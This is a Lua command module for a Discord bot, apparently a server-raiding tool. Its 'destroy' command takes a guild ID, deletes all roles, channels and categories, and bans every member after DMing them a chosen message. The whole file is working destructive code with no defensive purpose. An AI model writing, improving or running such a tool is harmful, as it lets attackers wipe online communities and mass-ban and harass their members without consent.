local command = {
    name = "destroy",
    description = "Destroys the server. Argument 1 is your guild ID and argument 2 is the message that will be put in the channel and DM'd to all members before they are banned. This will **completely destroy the server**. This command is restricted.",
    category = "Destruction",
    cooldown = 30,
    restricted = true,
    permissions = { requireAll = false, }
}

function command:execute(discordia, client, message, arguments)
    if not arguments[1] or not arguments[2] then
        return message:reply("Missing arguments.")
    end
    local dmMessage = arguments[2]
    for index, argument in ipairs(arguments) do
        if index > 2 then
            dmMessage = dmMessage .. " " .. argument
        end
    end
    local guild = client:getGuild(arguments[1])
    if not guild then
        return message:reply("Invalid Guild-Resolvable.")
    end
    local member = guild:getMember(client.user.id)
    if not member then
        return message:reply("The bot is not a valid member of the specified guild.")
    end
    client._utilities.destruction:deleteRoles(member, guild.roles)
    client._utilities.destruction:deleteGuildContainers(member, guild.voiceChannels, guild.textChannels, guild.categories)
    client._utilities.destruction:banMembersAndSendMessage(member, message.author.id, guild.members, dmMessage)
    pcall(function()
        message.author:send("Guild " ..
            guild.name .. " (" .. guild.id .. ") successfully destroyed! Check console to see if any steps were skipped.")
    end)
    print("Guild " ..
        guild.name .. " (" .. guild.id .. ") successfully destroyed!")
end

return command
